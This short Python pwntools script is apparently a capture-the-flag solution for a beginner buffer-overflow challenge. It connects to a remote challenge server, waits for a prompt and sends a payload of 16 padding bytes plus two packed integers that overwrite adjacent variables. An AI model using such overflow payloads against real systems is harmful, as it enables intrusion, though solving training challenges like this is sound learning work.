from pwn import *

r = remote("overflow101.heltsikker.no", 9001)

r.recvuntil("?: ")

payload = b"A" * 16 + p32(1337) + p32(2)
print(payload)
r.sendline(payload)

print(r.recvall())
